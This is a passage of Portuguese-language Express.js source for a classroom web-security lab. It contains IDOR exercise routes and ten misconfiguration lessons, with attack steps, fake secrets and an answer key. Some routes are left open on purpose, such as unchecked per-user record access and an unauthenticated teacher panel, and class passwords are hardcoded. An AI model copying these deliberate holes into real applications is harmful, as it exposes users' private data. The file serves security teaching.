        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 9. PEDIDOS — IDOR via parâmetro na query string em vez de parâmetro na URL (Teste 9)
app.get('/idor/:sala/pedidos', async (req, res) => {
    const { sala } = req.params;
    const usuarioNumero = parseInt(req.query.usuario_numero, 10) || 1;
    try {
        const perfilR = await pool.query('SELECT nome FROM idor_perfis WHERE sala=$1 AND numero=$2', [sala, usuarioNumero]);
        const nomeUsuario = perfilR.rows[0] ? perfilR.rows[0].nome : `usuário #${usuarioNumero}`;
        const r = await pool.query('SELECT * FROM idor_pedidos WHERE sala=$1 AND perfil_numero=$2 ORDER BY numero', [sala, usuarioNumero]);
        const linhas = r.rows.map(p => `
            <tr>
                <td style="padding:8px; border:1px solid #ddd;">${p.numero}</td>
                <td style="padding:8px; border:1px solid #ddd;">${escapeHtml(p.item)}</td>
                <td style="padding:8px; border:1px solid #ddd;">R$ ${p.valor}</td>
            </tr>
        `).join('');
        const html = `
            <h2>📦 Histórico de Pedidos — Lab ${sala}</h2>
            <p style="color:#666;">Mostrando os pedidos de <strong>${escapeHtml(nomeUsuario)}</strong> (perfil #${usuarioNumero}), só porque o número está disponível na própria URL (<code>?usuario_numero=${usuarioNumero}</code>).</p>
            <table style="width:100%; border-collapse:collapse;">
                <thead>
                    <tr style="background:#f2f2f2;">
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">#</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Item</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Valor</th>
                    </tr>
                </thead>
                <tbody>${linhas || '<tr><td colspan="3" style="padding:15px; text-align:center; color:#999;">Nenhum pedido encontrado.</td></tr>'}</tbody>
            </table>
        `;
        res.send(paginaIdor(sala, 'Pedidos', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 10. MENSAGENS PRIVADAS (Teste 10)
app.get('/idor/:sala/mensagem/:numero', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de mensagem inválido</h2>'));

    try {
        const r = await pool.query('SELECT * FROM idor_mensagens WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).send(paginaIdor(sala, 'Não encontrada', '<h2>❌ Mensagem não encontrada</h2>'));
        const m = r.rows[0];
        const html = `
            <h2>✉️ Conversa Privada #${m.numero} — Lab ${sala}</h2>
            <p style="color:#666;">Este deveria ser um canal privado entre um usuário específico e o suporte.</p>
            <div style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <p>${escapeHtml(m.conteudo)}</p>
            </div>
        `;
        res.send(paginaIdor(sala, 'Mensagem Privada', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 10.5 PROGRESSO DA SALA — o dashboard consulta isto ao carregar a página em vez de usar
//      localStorage, para que o ✅ exibido seja sempre o que está gravado no banco.
app.get('/idor/:sala/progresso', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT teste_id FROM idor_progresso WHERE sala=$1', [sala]);
        res.json({ concluidos: r.rows.map(row => row.teste_id) });
    } catch (error) {
        res.status(500).json({ concluidos: [], erro: error.message });
    }
});

// 11. VALIDAÇÃO DAS RESPOSTAS — compara o que o aluno encontrou com o valor correto guardado no servidor
//     e, se acertou, registra a conclusão no banco (idor_progresso) para o painel do professor ver.
app.post('/idor/:sala/validar', async (req, res) => {
    const { sala } = req.params;
    const { testeId, resposta } = req.body;
    const esperado = (RESPOSTAS_IDOR[sala] || {})[testeId];
    if (!esperado) return res.status(400).json({ correto: false, erro: 'Teste desconhecido' });

    const correto = normalizarRespostaIdor(resposta) === normalizarRespostaIdor(esperado);

    if (correto) {
        try {
            await pool.query(
                'INSERT INTO idor_progresso (sala, teste_id) VALUES ($1, $2) ON CONFLICT (sala, teste_id) DO UPDATE SET concluido_em = NOW()',
                [sala, testeId]
            );
        } catch (error) {
            console.error('Erro ao registrar progresso de IDOR:', error.message);
        }
    }

    res.json({ correto });
});

// 12. RESET DOS DADOS DE UMA SALA (restaura perfis, comprovantes, faturas, pedidos, chamados e mensagens)
app.post('/idor/:sala/reset', async (req, res) => {
    const { sala } = req.params;
    const client = await pool.connect();
    try {
        await client.query('BEGIN');

        await client.query('DELETE FROM idor_perfis WHERE sala=$1', [sala]);
        for (const p of SEED_IDOR_PERFIS[sala]) {
            await client.query(
                'INSERT INTO idor_perfis (sala, numero, nome, email, telefone, cargo, salario, cpf, bio, papel, token) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)',
                [sala, p.numero, p.nome, p.email, p.telefone, p.cargo, p.salario, p.cpf, p.bio, p.papel, p.token]
            );
        }

        await client.query('DELETE FROM idor_comprovantes WHERE sala=$1', [sala]);
        for (const c of SEED_IDOR_COMPROVANTES[sala]) {
            await client.query('INSERT INTO idor_comprovantes (sala, numero, perfil_numero, valor, descricao) VALUES ($1,$2,$3,$4,$5)', [sala, c.numero, c.perfil_numero, c.valor, c.descricao]);
        }

        await client.query('DELETE FROM idor_faturas WHERE sala=$1', [sala]);
        for (const f of SEED_IDOR_FATURAS[sala]) {
            await client.query('INSERT INTO idor_faturas (sala, numero, perfil_numero, valor, descricao) VALUES ($1,$2,$3,$4,$5)', [sala, f.numero, f.perfil_numero, f.valor, f.descricao]);
        }

        await client.query('DELETE FROM idor_pedidos WHERE sala=$1', [sala]);
        for (const p of SEED_IDOR_PEDIDOS[sala]) {
            await client.query('INSERT INTO idor_pedidos (sala, numero, perfil_numero, item, valor) VALUES ($1,$2,$3,$4,$5)', [sala, p.numero, p.perfil_numero, p.item, p.valor]);
        }

        await client.query('DELETE FROM idor_chamados WHERE sala=$1', [sala]);
        for (const c of SEED_IDOR_CHAMADOS[sala]) {
            await client.query('INSERT INTO idor_chamados (sala, numero, perfil_numero, assunto, mensagem) VALUES ($1,$2,$3,$4,$5)', [sala, c.numero, c.perfil_numero, c.assunto, c.mensagem]);
        }

        await client.query('DELETE FROM idor_mensagens WHERE sala=$1', [sala]);
        for (const m of SEED_IDOR_MENSAGENS[sala]) {
            await client.query('INSERT INTO idor_mensagens (sala, numero, perfil_numero, conteudo) VALUES ($1,$2,$3,$4)', [sala, m.numero, m.perfil_numero, m.conteudo]);
        }

        // O reset de dados também zera o progresso: depois de restaurar tudo, os exercícios
        // marcados como concluídos não fariam mais sentido (a "prova" do ataque desapareceu).
        await client.query('DELETE FROM idor_progresso WHERE sala=$1', [sala]);

        await client.query('COMMIT');
        res.json({ sucesso: true, mensagem: `✅ Dados e progresso do Lab ${sala} de IDOR resetados com sucesso!` });
    } catch (error) {
        await client.query('ROLLBACK');
        res.status(500).json({ sucesso: false, erro: error.message });
    } finally {
        client.release();
    }
});

// ============================================================================
// LABORATÓRIO DE MISCONFIGURATION + DADOS SENSÍVEIS
// ============================================================================
// Diferente do lab de IDOR, aqui nada é editado/excluído pelo aluno — cada
// exercício expõe um conteúdo fixo (arquivo, painel, endpoint) que nunca
// deveria estar acessível. Por isso não há tabelas de conteúdo: só uma
// tabela de progresso (misconfig_progresso), criada em create_table_misconfig.sql.
// Os valores abaixo são DIFERENTES entre sala 1 e sala 2 de propósito, para que
// a resposta certa de um exercício nunca seja a mesma nas duas salas.
const CONTEUDO_MISCONFIG = {
    '1': {
        backupSenha: 'Adm1n_2024_R3v',
        envApiKey: 'pk_live_8f2k9XQ4mZ',
        relatorioFaturamento: 'R$ 482.350,00',
        stacktraceSenha: 'R3l_2024!',
        painelCofreCodigo: 'COFRE-7741-A',
        comentarioSenhaQaTemp: 'Temp#2024xx',
        statusChaveSessao: 'SESS-INT-99821',
        diagnosticoBuildHeader: 'build-8821-stage',
        csvVipCodigo: 'VIP-CODE-3391',
        apiNotaInterna: 'PED-CONF-5512'
    },
    '2': {
        backupSenha: 'Root_S3gur4_99',
        envApiKey: 'pk_live_3jR7vLpN2y',
        relatorioFaturamento: 'R$ 597.120,00',
        stacktraceSenha: 'Fin_2024#',
        painelCofreCodigo: 'COFRE-5520-B',
        comentarioSenhaQaTemp: 'Temp#2024yy',
        statusChaveSessao: 'SESS-INT-44310',
        diagnosticoBuildHeader: 'build-4470-stage',
        csvVipCodigo: 'VIP-CODE-7765',
        apiNotaInterna: 'PED-CONF-9087'
    }
};

// As 10 lições do laboratório, da mais fácil (digitar uma URL) até a mais conceitual
// (entender o que um cabeçalho de CORS aberto demais permite a um site malicioso).
const testesMisconfig = [
    {
        id: 'misconfig1',
        nome: '1️⃣ Backup de Banco Exposto (Arquivo Esquecido no Servidor)',
        oQueAlunoFaz: 'Acesse o painel em /misconfig/SALA e veja que não existe nenhum link óbvio para arquivos de backup.',
        acaoDoAtaque: 'Mesmo assim, digite diretamente na barra de endereço: /misconfig/SALA/backup-loja.sql — um arquivo de backup do banco de dados que ficou esquecido na pasta pública do servidor.',
        licao: 'Backups de banco de dados nunca deveriam ficar acessíveis numa pasta pública do servidor. É um erro de configuração (misconfiguration) clássico: alguém gerou o arquivo para uso interno e esqueceu de removê-lo ou de restringir o acesso.',
        pergunta: 'Qual é a senha do administrador encontrada dentro do arquivo de backup?'
    },
    {
        id: 'misconfig2',
        nome: '2️⃣ Arquivo .env Exposto (Credenciais de Configuração)',
        oQueAlunoFaz: 'Sistemas Node.js costumam guardar credenciais sensíveis (chaves de API, senhas de banco) num arquivo chamado .env, que nunca deveria ser enviado pelo servidor.',
        acaoDoAtaque: 'Acesse /misconfig/SALA/.env diretamente no navegador e veja que o servidor devolve o conteúdo desse arquivo de configuração, ao invés de bloquear o acesso.',
        licao: 'Arquivos de configuração com segredos (.env, config.json, etc.) precisam estar fora da pasta pública do site e bloqueados no servidor. Se um atacante consegue baixar o .env, ele ganha acesso a todas as chaves e senhas do sistema de uma vez.',
        pergunta: 'Qual é o valor da variável API_KEY_PAGAMENTO exposta no arquivo .env?'
    },
    {
        id: 'misconfig3',
        nome: '3️⃣ Listagem de Diretório Habilitada',
        oQueAlunoFaz: 'Clique no atalho "Pasta de Uploads" no painel (ou acesse /misconfig/SALA/uploads) e observe que o servidor mostra a lista de TODOS os arquivos da pasta, como se fosse um gerenciador de arquivos — algo que nunca deveria estar habilitado em produção.',
        acaoDoAtaque: 'Clique no arquivo "relatorio-financeiro-2024.txt" que aparece na listagem e leia seu conteúdo, mesmo sem ter nenhum link para ele em nenhuma outra tela do sistema.',
        licao: '"Directory listing" habilitado expõe a estrutura inteira de arquivos do servidor para qualquer visitante — inclusive arquivos que ninguém pretendia divulgar, só porque alguém esqueceu de desativar essa opção no servidor web.',
        pergunta: 'Qual é o valor do faturamento confidencial do trimestre informado no relatório?'
    },
    {
        id: 'misconfig4',
        nome: '4️⃣ Mensagem de Erro Detalhada (Stack Trace)',
        oQueAlunoFaz: 'Acesse /misconfig/SALA/relatorio/7 (um número de relatório válido) e veja a tela normal de relatório.',
        acaoDoAtaque: 'Agora acesse /misconfig/SALA/relatorio/abc (um valor que não é número, para forçar um erro). Em vez de mostrar uma mensagem genérica, o servidor devolve o erro técnico completo (stack trace), revelando caminhos internos do servidor e até uma string de conexão com o banco de dados.',
        licao: 'Em produção, o servidor nunca deveria devolver o erro técnico bruto para o usuário — isso é trabalho de log interno, não de resposta HTTP. Mensagens de erro detalhadas entregam de bandeja informações que ajudam um atacante a entender e invadir o sistema.',
        pergunta: 'Qual é a senha do usuário "relatorios_user" revelada na string de conexão dentro do erro?'
    },
    {
        id: 'misconfig5',
        nome: '5️⃣ Painel Administrativo Sem Autenticação',
        oQueAlunoFaz: 'Repare que nenhum menu do laboratório linka para uma área administrativa interna.',
        acaoDoAtaque: 'Mesmo assim, acesse diretamente /misconfig/SALA/painel-interno. O painel administrativo da empresa abre sem pedir login nenhum, mostrando informações que deveriam ser restritas à equipe interna.',
        licao: 'Uma URL "escondida" não é controle de acesso — é só "segurança por obscuridade", que não funciona. Toda área administrativa precisa de autenticação real verificada no servidor, não apenas a ausência de um link visível.',
        pergunta: 'Qual é o código de acesso ao cofre de documentos revelado no painel interno?'
    },
    {
        id: 'misconfig6',
        nome: '6️⃣ Credenciais Esquecidas em Comentário no Código-Fonte',
        oQueAlunoFaz: 'Clique no atalho "Contato" no painel (ou acesse /misconfig/SALA/contato) normalmente, como qualquer visitante do site faria.',
        acaoDoAtaque: 'Clique com o botão direito na página e escolha "Ver código-fonte da página" (ou aperte Ctrl+U). Procure por um comentário HTML deixado pela equipe de desenvolvimento, esquecido antes de colocar o site em produção.',
        licao: 'Comentários no HTML são enviados ao navegador de qualquer visitante e podem ser lidos por qualquer pessoa — nunca deixe senhas, credenciais de teste ou anotações internas em comentários de código que vai para produção.',
        pergunta: 'Qual é a senha do usuário de teste "qa_temp" encontrada no comentário?'
    },
    {
        id: 'misconfig7',
        nome: '7️⃣ Endpoint de Diagnóstico Expõe Dados Internos',
        oQueAlunoFaz: 'Sistemas costumam ter rotas de diagnóstico/health-check para monitoramento automático (ex.: verificar se o servidor está de pé).',
        acaoDoAtaque: 'Clique no atalho "Status / Debug" no painel (ou acesse /misconfig/SALA/status) e veja que o endpoint devolve, em JSON, informações internas que vão muito além de "o servidor está ligado": ambiente, endereço de servidor interno e uma chave de sessão interna.',
        licao: 'Endpoints de diagnóstico devem responder o mínimo necessário (ex.: apenas "ok"). Quando devolvem detalhes internos da infraestrutura, eles se tornam uma fonte gratuita de informação para quem está mapeando o sistema antes de um ataque.',
        pergunta: 'Qual é o valor da "chave_sessao_interna" mostrada no JSON de /misconfig/SALA/status?'
    },
    {
        id: 'misconfig8',
        nome: '8️⃣ Cabeçalho de Resposta Revela Informação de Build Interna',
        oQueAlunoFaz: 'Clique no atalho "Diagnóstico" no painel (ou acesse /misconfig/SALA/diagnostico) — a própria página mostra, na tela, quais cabeçalhos (headers) o servidor enviou na resposta dela mesma.',
        acaoDoAtaque: 'Observe entre os cabeçalhos listados um chamado X-Internal-Build, com um valor que não deveria sair do ambiente interno de desenvolvimento.',
        licao: 'Cabeçalhos HTTP personalizados criados para debug interno (versão de build, nome de servidor, caminho interno) às vezes são deixados ativos em produção sem querer. Qualquer cabeçalho de resposta é visível para qualquer visitante — não é um canal privado.',
        pergunta: 'Qual é o valor do cabeçalho X-Internal-Build mostrado na página de diagnóstico?'
    },
    {
        id: 'misconfig9',
        nome: '9️⃣ Exportação Pública de Dados Sensíveis (CSV sem Autenticação)',
        oQueAlunoFaz: 'Note que não existe nenhum botão "Exportar clientes" em nenhuma tela visível do laboratório.',
        acaoDoAtaque: 'Acesse diretamente /misconfig/SALA/exportar/clientes.csv. O servidor devolve um arquivo CSV completo com dados de clientes (CPF, e-mail, cartão parcialmente mascarado), sem exigir login nenhum.',
        licao: 'Funcionalidades de exportação de dados (relatórios, planilhas, CSVs) costumam ser construídas "por dentro" do sistema, pensando só em quem já está logado no painel — e acabam esquecidas sem nenhuma verificação de permissão quando alguém descobre a URL direta.',
        pergunta: 'Qual é o código da observação interna anotada ao lado do cliente marcado como VIP no CSV?'
    },
    {
        id: 'misconfig10',
        nome: '🔟 CORS Mal Configurado — Qualquer Site Pode Ler os Dados',
        oQueAlunoFaz: 'Acesse /misconfig/SALA/api/pedidos-internos e veja que essa API interna devolve, em JSON, pedidos e uma nota interna confidencial — sem exigir login.',
        acaoDoAtaque: 'Observe, na própria tela, que o cabeçalho de resposta Access-Control-Allow-Origin está configurado como "*" (asterisco). Isso significa que essa API aceita ser chamada por JavaScript rodando em QUALQUER site da internet, não apenas pelo nosso laboratório — um site malicioso poderia embutir essa chamada e roubar esses dados de quem estivesse com a sessão ativa.',
        licao: 'CORS (Cross-Origin Resource Sharing) existe para o navegador controlar quem pode ler a resposta de uma API por JavaScript de outro site. Usar Access-Control-Allow-Origin: "*" numa API que devolve dados sensíveis anula essa proteção por completo — é como deixar a porta dos fundos aberta para o mundo inteiro, achando que ninguém vai notar.',
        pergunta: 'Qual é o código da "nota_interna" confidencial revelada no JSON da API de pedidos internos?'
    }
];

// Respostas corretas de cada desafio — nunca são enviadas ao navegador, só comparadas no servidor.
const RESPOSTAS_MISCONFIG = {
    '1': {
        misconfig1: CONTEUDO_MISCONFIG['1'].backupSenha,
        misconfig2: CONTEUDO_MISCONFIG['1'].envApiKey,
        misconfig3: CONTEUDO_MISCONFIG['1'].relatorioFaturamento,
        misconfig4: CONTEUDO_MISCONFIG['1'].stacktraceSenha,
        misconfig5: CONTEUDO_MISCONFIG['1'].painelCofreCodigo,
        misconfig6: CONTEUDO_MISCONFIG['1'].comentarioSenhaQaTemp,
        misconfig7: CONTEUDO_MISCONFIG['1'].statusChaveSessao,
        misconfig8: CONTEUDO_MISCONFIG['1'].diagnosticoBuildHeader,
        misconfig9: CONTEUDO_MISCONFIG['1'].csvVipCodigo,
        misconfig10: CONTEUDO_MISCONFIG['1'].apiNotaInterna
    },
    '2': {
        misconfig1: CONTEUDO_MISCONFIG['2'].backupSenha,
        misconfig2: CONTEUDO_MISCONFIG['2'].envApiKey,
        misconfig3: CONTEUDO_MISCONFIG['2'].relatorioFaturamento,
        misconfig4: CONTEUDO_MISCONFIG['2'].stacktraceSenha,
        misconfig5: CONTEUDO_MISCONFIG['2'].painelCofreCodigo,
        misconfig6: CONTEUDO_MISCONFIG['2'].comentarioSenhaQaTemp,
        misconfig7: CONTEUDO_MISCONFIG['2'].statusChaveSessao,
        misconfig8: CONTEUDO_MISCONFIG['2'].diagnosticoBuildHeader,
        misconfig9: CONTEUDO_MISCONFIG['2'].csvVipCodigo,
        misconfig10: CONTEUDO_MISCONFIG['2'].apiNotaInterna
    }
};

// Compara respostas ignorando acentos, maiúsculas/minúsculas e pontuação/espaçamento.
function normalizarRespostaMisconfig(s) {
    return String(s || '')
        .normalize('NFD').replace(/[̀-ͯ]/g, '')
        .toLowerCase()
        .replace(/[^a-z0-9]/g, '');
}

function renderMenuMisconfig(sala) {
    let menu = '';
    testesMisconfig.forEach(teste => {
        const oQueAlunoFaz = teste.oQueAlunoFaz.replace(/SALA/g, sala);
        const acaoDoAtaque = teste.acaoDoAtaque.replace(/SALA/g, sala);
        menu += `
            <div class="teste-item">
                <a href="javascript:void(0)" class="teste-link" id="link-${teste.id}" onclick="toggleTesteMisconfig('${teste.id}')">
                    <strong style="font-size:13px;" id="titulo-${teste.id}">${escapeHtml(teste.nome)}</strong>
                </a>
                <div class="teste-panel" id="panel-${teste.id}">
                    <p style="margin:6px 0; color:#333; font-size:12px;"><strong>📍 O que o aluno faz:</strong> ${escapeHtml(oQueAlunoFaz)}</p>
                    <p style="margin:6px 0; color:#0b5d57; font-size:12px;"><strong>⚔️ Ação do ataque:</strong> ${escapeHtml(acaoDoAtaque)}</p>
                    <p style="margin:6px 0; color:#155724; font-size:12px;"><strong>🎓 Lição:</strong> ${escapeHtml(teste.licao)}</p>
                    <div style="background:white; border:1px solid #0F766E; border-radius:4px; padding:10px; margin-top:10px;">
                        <p style="margin:0 0 6px 0; font-size:12px; font-weight:bold; color:#333;">${escapeHtml(teste.pergunta)}</p>
                        <input type="text" id="resposta-${teste.id}" placeholder="Cole aqui a resposta encontrada..." style="width:100%; padding:8px; margin-bottom:8px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; font-size:12px;">
                        <button onclick="validarTesteMisconfig('${teste.id}')" style="width:100%; padding:8px; background:#0F766E; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:12px;">✅ Validar Resposta</button>
                        <p id="feedback-${teste.id}" style="margin:8px 0 0 0; font-size:11px;"></p>
                    </div>
                </div>
            </div>
        `;
    });
    return menu;
}

const sidebarStyleMisconfig = `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: sans-serif; background: white; }
    .container { display: flex; min-height: 100vh; }
    .sidebar { width: 340px; background: #f5f5f5; padding: 20px; overflow-y: auto; border-right: 2px solid #ddd; }
    .main { flex: 1; padding: 30px; overflow-y: auto; background: white; }
    .sidebar h2 { margin-top: 0; margin-bottom: 6px; color: #333; font-size: 16px; }
    .sidebar p { font-size: 12px; color: #666; margin-bottom: 15px; }
    .teste-item { margin: 8px 0; }
    .teste-link { display:block; padding:12px; border-radius:4px; text-decoration:none; background:#f9f9f9; border:1px solid #ddd; color:#333; cursor:pointer; transition:all 0.2s; }
    .teste-link.active { background:#0F766E; color:white; border:2px solid #0B5D57; }
    .teste-link.concluido { border-left: 4px solid #28a745; }
    .teste-panel { display:none; background:#e9f9f7; padding:12px; border-radius:4px; margin-top:6px; border-left:4px solid #0F766E; }
    .teste-panel.open { display:block; }
    .reset-btn { display:block; width:100%; text-align:center; padding:12px; background:#6c757d; color:white; border:none; border-radius:4px; margin-top:20px; font-weight:bold; cursor:pointer; font-size:13px; }
    .nav-link { display:block; text-align:center; padding:10px; background:#6c757d; color:white; text-decoration:none; border-radius:4px; margin-top:10px; font-size: 13px; }
`;

const scriptAccordionMisconfig = `
    let testeAbertoMisconfig = null;
    function toggleTesteMisconfig(id) {
        const painelNovo = document.getElementById('panel-' + id);
        const linkNovo = document.getElementById('link-' + id);
        const reabrindoMesmo = testeAbertoMisconfig === id;

        if (testeAbertoMisconfig) {
            document.getElementById('panel-' + testeAbertoMisconfig).classList.remove('open');
            document.getElementById('link-' + testeAbertoMisconfig).classList.remove('active');
        }

        if (reabrindoMesmo) {
            testeAbertoMisconfig = null;
        } else {
            painelNovo.classList.add('open');
            linkNovo.classList.add('active');
            testeAbertoMisconfig = id;
        }
    }

    function atualizarContadorMisconfig(total) {
        const contador = document.getElementById('contador-progresso');
        if (contador) contador.textContent = total + ' / 10 concluídos';
    }

    function marcarConcluidoMisconfig(id) {
        const link = document.getElementById('link-' + id);
        const titulo = document.getElementById('titulo-' + id);
        if (link) link.classList.add('concluido');
        if (titulo && titulo.textContent.indexOf('✅') === -1) titulo.textContent = '✅ ' + titulo.textContent;
    }

    function desmarcarTodosMisconfig() {
        document.querySelectorAll('.teste-link.concluido').forEach(function(link) {
            link.classList.remove('concluido');
        });
        document.querySelectorAll('[id^="titulo-misconfig"]').forEach(function(titulo) {
            titulo.textContent = titulo.textContent.replace('✅ ', '');
        });
    }

    async function carregarProgressoDoServidorMisconfig(sala) {
        try {
            const response = await fetch('/misconfig/' + sala + '/progresso');
            const resultado = await response.json();
            desmarcarTodosMisconfig();
            (resultado.concluidos || []).forEach(marcarConcluidoMisconfig);
            atualizarContadorMisconfig((resultado.concluidos || []).length);
        } catch (err) {
            console.error('Erro ao carregar progresso:', err.message);
        }
    }

    async function validarTesteMisconfig(id) {
        const sala = window.SALA_ATUAL;
        const input = document.getElementById('resposta-' + id);
        const feedback = document.getElementById('feedback-' + id);
        const resposta = input.value;
        try {
            const response = await fetch('/misconfig/' + sala + '/validar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ testeId: id, resposta: resposta })
            });
            const resultado = await response.json();
            if (resultado.correto) {
                feedback.textContent = '✅ Correto! Exercício concluído.';
                feedback.style.color = '#28a745';
                await carregarProgressoDoServidorMisconfig(sala);
            } else {
                feedback.textContent = '❌ Ainda não é isso. Revise os passos do ataque e tente de novo.';
                feedback.style.color = '#dc3545';
            }
        } catch (err) {
            feedback.textContent = '❌ Erro ao validar: ' + err.message;
            feedback.style.color = '#dc3545';
        }
    }

    async function resetarProgressoMisconfig(sala) {
        if (!confirm('⚠️ Isso vai zerar o progresso dos 10 exercícios do Lab ' + sala + ' de Misconfiguration. Continuar?')) {
            return;
        }
        try {
            const response = await fetch('/misconfig/' + sala + '/reset', { method: 'POST' });
            const resultado = await response.json();
            alert(resultado.mensagem || resultado.erro);
            window.location.reload();
        } catch (err) {
            alert('❌ Erro ao resetar: ' + err.message);
        }
    }
`;

// Envolve o conteúdo de cada tela do lab no mesmo layout simples usado no lab de IDOR
function paginaMisconfig(sala, titulo, conteudoHtml) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>${escapeHtml(titulo)} - Lab Misconfiguration ${sala}</title>
        </head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            ${conteudoHtml}
            <br>
            <a href="/misconfig/${sala}" style="color:#0F766E; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `;
}

// Mesmas credenciais de turma usadas no lab de IDOR (login por sala, não por aluno).
const CREDENCIAIS_MISCONFIG = {
    'sala-a': { senha: 'a-sala', sala: '1', nomeExibicao: 'Sala A' },
    'sala-b': { senha: 'sala-b', sala: '2', nomeExibicao: 'Sala B' }
};

// 0. LOGIN DA SALA — página estática, ver public/misconfig-login.html
app.get('/misconfig', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'misconfig-login.html'));
});

app.post('/misconfig/login', (req, res) => {
    const usuario = String(req.body.usuario || '').trim().toLowerCase();
    const senha = String(req.body.senha || '');
    const conta = CREDENCIAIS_MISCONFIG[usuario];

    if (!conta || conta.senha !== senha) {
        return res.redirect('/misconfig?erro=1');
    }

    req.session.misconfigSala = conta.sala;
    req.session.misconfigNomeExibicao = conta.nomeExibicao;
    res.redirect(`/misconfig/${conta.sala}`);
});

app.get('/misconfig/logout', (req, res) => {
    req.session.misconfigSala = null;
    req.session.misconfigNomeExibicao = null;
    res.redirect('/misconfig');
});

function exigirLoginMisconfig(req, res, next) {
    if (req.session.misconfigSala && req.session.misconfigSala === req.params.sala) {
        return next();
    }
    res.redirect('/misconfig');
}

// PAINEL OCULTO DO PROFESSOR — precisa ser registrado ANTES de "/misconfig/:sala" abaixo,
// pelo mesmo motivo do lab de IDOR (senão "painel-professor" seria tratado como valor de :sala).
app.get('/misconfig/painel-professor', async (req, res) => {
    try {
        const r = await pool.query('SELECT sala, teste_id, concluido_em FROM misconfig_progresso');
        const concluidos = {};
        r.rows.forEach(row => {
            concluidos[`${row.sala}:${row.teste_id}`] = row.concluido_em;
        });

        const linhas = testesMisconfig.map(teste => {
            const celulaSala = (salaId) => {
                const concluidoEm = concluidos[`${salaId}:${teste.id}`];
                if (concluidoEm) {
                    return `<td style="padding:10px; border:1px solid #ddd; text-align:center; background:#d4edda;">✅<br><small style="color:#666;">${new Date(concluidoEm).toLocaleString('pt-BR')}</small></td>`;
                }
                return '<td style="padding:10px; border:1px solid #ddd; text-align:center; background:#f8d7da; color:#721c24;">❌</td>';
            };
            return `
                <tr>
                    <td style="padding:10px; border:1px solid #ddd;">${escapeHtml(teste.nome)}</td>
                    ${celulaSala('1')}
                    ${celulaSala('2')}
                </tr>
            `;
        }).join('');

        const totalSalaA = Object.keys(concluidos).filter(k => k.startsWith('1:')).length;
        const totalSalaB = Object.keys(concluidos).filter(k => k.startsWith('2:')).length;

        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>Painel do Professor - Lab Misconfiguration</title>
            </head>
            <body style="font-family: sans-serif; max-width: 900px; margin: 40px auto; padding: 20px;">
                <h2>🧑‍🏫 Painel do Professor — Progresso do Lab de Misconfiguration</h2>
                <p style="color:#666;">Esta página não tem link em nenhum menu — só quem conhece o endereço acessa.</p>

                <div style="display:flex; gap:15px; margin-bottom:20px;">
                    <div style="flex:1; background:#e9f9f7; border-left:4px solid #0F766E; padding:15px; border-radius:4px;">
                        <strong>Sala A</strong> — ${totalSalaA} / 10 concluídos
                    </div>
                    <div style="flex:1; background:#e9f9f7; border-left:4px solid #0F766E; padding:15px; border-radius:4px;">
                        <strong>Sala B</strong> — ${totalSalaB} / 10 concluídos
                    </div>
                </div>

                <table style="width:100%; border-collapse:collapse;">
                    <thead>
                        <tr style="background:#f2f2f2;">
                            <th style="padding:10px; border:1px solid #ddd; text-align:left;">Exercício</th>
                            <th style="padding:10px; border:1px solid #ddd;">Sala A</th>
                            <th style="padding:10px; border:1px solid #ddd;">Sala B</th>
                        </tr>
                    </thead>
                    <tbody>${linhas}</tbody>
                </table>

                <div style="margin-top:25px; display:flex; gap:10px;">
                    <form action="/misconfig/painel-professor/limpar/1" method="POST" onsubmit="return confirm('Limpar todo o progresso registrado da Sala A?');">
                        <button type="submit" style="padding:10px 18px; background:#6c757d; color:white; border:none; border-radius:4px; cursor:pointer;">🧹 Limpar progresso da Sala A</button>
                    </form>
                    <form action="/misconfig/painel-professor/limpar/2" method="POST" onsubmit="return confirm('Limpar todo o progresso registrado da Sala B?');">
                        <button type="submit" style="padding:10px 18px; background:#6c757d; color:white; border:none; border-radius:4px; cursor:pointer;">🧹 Limpar progresso da Sala B</button>
                    </form>
                </div>
            </body>
            </html>
        `);
    } catch (error) {
        res.status(500).send(`<p style="color:red; font-family:sans-serif;">❌ Erro: ${escapeHtml(error.message)}</p>`);
    }
});

app.post('/misconfig/painel-professor/limpar/:sala', async (req, res) => {
    const { sala } = req.params;
    try {
        await pool.query('DELETE FROM misconfig_progresso WHERE sala=$1', [sala]);
        res.redirect('/misconfig/painel-professor');
    } catch (error) {
        res.status(500).send(`<p style="color:red; font-family:sans-serif;">❌ Erro: ${escapeHtml(error.message)}</p>`);
    }
});

// 1. DASHBOARD DO LAB (menu lateral com os 10 testes + atalhos para as telas "expostas")
app.get('/misconfig/:sala', exigirLoginMisconfig, (req, res) => {
    const { sala } = req.params;
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Laboratório Misconfiguration - Lab ${sala}</title>
            <style>${sidebarStyleMisconfig}</style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <h2>⚙️ 10 Testes de Misconfiguration</h2>
